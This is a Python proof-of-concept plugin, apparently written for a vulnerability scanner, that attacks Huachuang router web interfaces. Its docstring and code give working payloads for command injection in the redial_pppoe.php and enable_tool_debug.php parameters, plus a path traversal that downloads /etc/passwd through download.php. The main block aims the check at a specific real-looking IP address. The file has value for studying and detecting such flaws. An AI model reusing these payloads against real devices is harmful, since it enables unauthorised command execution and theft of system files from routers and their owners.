#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创设备最后三处漏洞(命令执行+任意文件下载)
refer: 0day
description:
    不玩了
    真的是不同的文件，不同的接口，下面有图为证，我挖0day容易么我，，，
POC:
    1. http://foobar/acc/network/redial_pppoe.php?wan=a|echo testvul6>testvul.txt||
    2. http://foobar/acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c 1 localhost | echo testvul1>testvul.txt||a
    3. http://foobar/acc/vpn/download.php?f=../../../../../../etc/passwd
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        return True, arg

def audit(arg):
    payloads = [
        arg + 'acc/network/redial_pppoe.php?wan=a|echo%20testvul0>test.txt||',
        arg + 'acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c%201%20localhost%20|%20echo%20testvul1%20>%20test.txt%20||%20a',
    ]
    verifys = [
        arg + 'acc/network/test.txt',
        arg + 'acc/tools/test.txt',
    ]
    for i in range(len(payloads)):
        payload = payloads[i]
        verify = verifys[i]
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200:
            code, head, res, err, _ = curl.curl2(verify)
            if code == 200 and ('testvul'+str(i)) in res:
                security_hole('命令执行: ' + payload)
    payload = arg + 'acc/vpn/download.php?f=../../../../../../etc/passwd'
    code, head, res, err, _ = curl.curl2(payload)
    if code==200 and 'root:x:0:0:' in res:
        security_hole('arbitrarily file download: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])